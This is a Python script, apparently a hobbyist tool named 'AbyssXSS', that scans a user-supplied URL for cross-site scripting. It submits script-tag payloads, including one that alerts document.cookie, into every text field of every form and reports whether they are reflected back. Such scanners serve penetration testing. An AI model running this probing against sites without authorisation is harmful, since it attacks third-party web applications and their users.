import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

def AbyssXSS_logo():
    print("""          
          
 ▄▄▄       ▄▄▄▄ ▓██   ██▓  ██████   ██████ ▒██   ██▒  ██████   ██████ 
▒████▄    ▓█████▄▒██  ██▒▒██    ▒ ▒██    ▒ ▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ 
▒██  ▀█▄  ▒██▒ ▄██▒██ ██░░ ▓██▄   ░ ▓██▄   ░░  █   ░░ ▓██▄   ░ ▓██▄   
░██▄▄▄▄██ ▒██░█▀  ░ ▐██▓░  ▒   ██▒  ▒   ██▒ ░ █ █ ▒   ▒   ██▒  ▒   ██▒
 ▓█   ▓██▒░▓█  ▀█▓░ ██▒▓░▒██████▒▒▒██████▒▒▒██▒ ▒██▒▒██████▒▒▒██████▒▒
 ▒▒   ▓▒█░░▒▓███▀▒ ██▒▒▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
  ▒   ▒▒ ░▒░▒   ░▓██ ░▒░ ░ ░▒  ░ ░░ ░▒  ░ ░░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
  ░   ▒    ░    ░▒ ▒ ░░  ░  ░  ░  ░  ░  ░   ░    ░  ░  ░  ░  ░  ░  ░  
      ░  ░ ░     ░ ░           ░        ░   ░    ░        ░        ░  
                ░░ ░                                                                         
                
          """)

AbyssXSS_logo()

def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs

    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        elif input["type"] == "hidden" and input["name"]:
            data[input["name"]] = input.get("value", "")

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Payload : {data}")
    
    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data)
        else:
            response = requests.get(target_url, params=data)
        
        return response
    except requests.RequestException as e:
        print(f"Error during request: {e}")
        return None

def AbyssXSS_scan(url, payload, xss_type):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    is_vulnerable = False
    
    for form in forms:
        form_details = get_form_details(form)
        response = submit_form(form_details, url, payload)
        
        if response:
            try:
                content = response.content.decode('utf-8')
            except UnicodeDecodeError:
                print("scan for url is not vulnerable xss")
                continue
            
            if payload in content:
                print(f"[+] {xss_type} Vulnerable XSS Detected on {url}")
                print(f"[*] Form details :")
                pprint(form_details)
                is_vulnerable = True

    return "[*] Vulnerable XSS " if is_vulnerable else "[*] Not XSS Vulnerable"

def AbyssXSS_payload_menu(url):
    DOM_payloads = {
        "http://example.com": "<script>alert('DOM XSS')</script>"
    }

    payloads = {
        "1": "<script>alert('Reflected XSS')</script>",  
        "2": "<script>alert(document.cookie)</script>",  
        "3": "<script>alert('Default DOM XSS')</script>",  
    }

    print("SELECT XSS PAYLOADS:")
    print("[+] 1. Reflected XSS")
    print("[+] 2. Stored XSS")
    print("[+] 3. DOM XSS")
    
    AbyXSS_choice = input("Enter the number of the XSS type: ")
    
    if AbyXSS_choice == "1":
        xss_type = "Reflected XSS"
        payload = payloads.get("1") 
    elif AbyXSS_choice == "2":
        xss_type = "Stored XSS"
        payload = payloads.get("2")  
    elif AbyXSS_choice == "3":
        xss_type = "DOM XSS"
        if url in DOM_payloads:
            payload = DOM_payloads[url]
        else:
            payload = payloads.get("3")  
        print(f"Using payload: {payload}")
    else:
        print("hmm.")
        xss_type = "Reflected XSS"
        payload = payloads.get("1")  

    return payload, xss_type

if __name__ == "__main__":
    url = input("Enter the XSS Target URL : ")
    payload, xss_type = AbyssXSS_payload_menu(url)
    result = AbyssXSS_scan(url, payload, xss_type)
    print(result)










































 
    






